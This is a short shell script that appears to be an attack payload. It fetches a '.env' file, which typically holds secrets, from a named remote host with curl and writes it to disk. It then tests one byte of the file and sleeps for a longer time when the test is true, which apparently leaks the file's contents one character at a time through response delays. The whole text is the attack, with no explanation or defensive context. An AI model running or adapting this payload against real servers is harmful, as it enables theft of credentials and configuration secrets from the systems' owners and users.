#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +15 /wa|head -c1)" < '2' ]&&sleep 25
sleep 12
